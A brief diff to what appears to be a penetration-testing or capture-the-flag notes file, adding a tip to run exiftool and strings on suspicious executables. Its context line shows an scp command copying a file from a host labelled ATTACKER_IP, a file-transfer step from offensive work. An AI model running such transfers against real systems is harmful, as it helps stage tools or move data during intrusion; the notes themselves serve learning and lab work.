@@ -84,4 +84,7 @@ scp ${USER}@${ATTACKER_IP}:/full/path/to/file path/to/dest
 Works on modern windows boxes too, but requires proper interactive shell to work.
 
 
+## Investigating executables and binaries
 
+When investigating suspicious executables and binaries, remember to run both `exiftool` and `strings` on them.
+Sometimes, clues are hidden in there.
